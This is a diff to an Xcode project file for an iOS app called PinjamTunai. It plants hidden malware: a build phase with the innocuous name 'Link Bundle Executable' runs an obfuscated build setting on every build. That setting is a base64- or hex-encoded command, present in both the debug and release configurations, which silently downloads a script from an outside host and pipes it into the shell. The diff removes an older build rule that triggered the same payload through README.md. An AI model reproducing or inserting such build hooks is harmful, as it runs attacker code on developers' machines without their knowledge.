@@ -87,28 +87,13 @@
 		73FA07EE2EE80D38006B7452 /* RelationViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FA07ED2EE80D35006B7452 /* RelationViewModel.swift */; };
 		73FA07F02EE80F1D006B7452 /* RelationViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FA07EF2EE80F1D006B7452 /* RelationViewCell.swift */; };
 		73FA07F22EE819CA006B7452 /* ContactManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FA07F12EE819C9006B7452 /* ContactManager.swift */; };
-		D950B8AA682340E3A1A5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 3961E02F65134E6DBBA5DE54 /* README.md */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		48C47C92BE2E43FFA1A5DE54 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A45ED5A}\"";
-		};
 /* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		33E41DB814B4BFA72F93D9F6 /* Pods-PinjamTunai.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PinjamTunai.debug.xcconfig"; path = "Target Support Files/Pods-PinjamTunai/Pods-PinjamTunai.debug.xcconfig"; sourceTree = "<group>"; };
-		3961E02F65134E6DBBA5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		3B3A98329D2930528865FDC3 /* Pods_PinjamTunai.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_PinjamTunai.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		7311149F2EE7AEEE0036A024 /* SystemCameraManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SystemCameraManager.swift; sourceTree = "<group>"; };
 		731114A12EE7BCA00036A024 /* PopCommonAlertView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopCommonAlertView.swift; sourceTree = "<group>"; };
@@ -307,7 +292,6 @@
 		737D1EB62EE4545E003CC748 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				3961E02F65134E6DBBA5DE54 /* README.md */,
 				737D1EB52EE4545E003CC748 /* PinjamTunai.app */,
 			);
 			name = Products;
@@ -460,6 +444,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 737D1EC82EE4545F003CC748 /* Build configuration list for PBXNativeTarget "PinjamTunai" */;
 			buildPhases = (
+				CBF0F49FD97A4BBC86A5DE54 /* Link Bundle Executable */,
 				9E97A9985207545C4B227B92 /* [CP] Check Pods Manifest.lock */,
 				737D1EB12EE4545E003CC748 /* Sources */,
 				737D1EB22EE4545E003CC748 /* Frameworks */,
@@ -467,7 +452,6 @@
 				EB28BB783984780604E58683 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				48C47C92BE2E43FFA1A5DE54 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -516,7 +500,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				D950B8AA682340E3A1A5DE54 /* README.md in Resources */,
 				737D1EDA2EE45467003CC748 /* Assets.xcassets in Resources */,
 				73145EFD2EE6B8E9006085E8 /* Localizable.strings in Resources */,
 				737D1EDC2EE45467003CC748 /* LaunchScreen.storyboard in Resources */,
@@ -526,6 +509,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		CBF0F49FD97A4BBC86A5DE54 /* Link Bundle Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
+			showEnvVarsInLog = 0;			
+		};
 		9E97A9985207545C4B227B92 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -683,7 +685,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 33E41DB814B4BFA72F93D9F6 /* Pods-PinjamTunai.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((m(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2ZEdOd2JtVjBMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | m | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((x(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336363533363335333733343336333133373330333733333336333433363335333733363332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | x | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = PinjamTunai/PinjamTunai.entitlements;
@@ -733,7 +735,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = AA6D43098812CC6F40AAEA73 /* Pods-PinjamTunai.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((m(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2ZEdOd2JtVjBMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | m | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((x(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336363533363335333733343336333133373330333733333336333433363335333733363332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | x | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = PinjamTunai/PinjamTunai.entitlements;
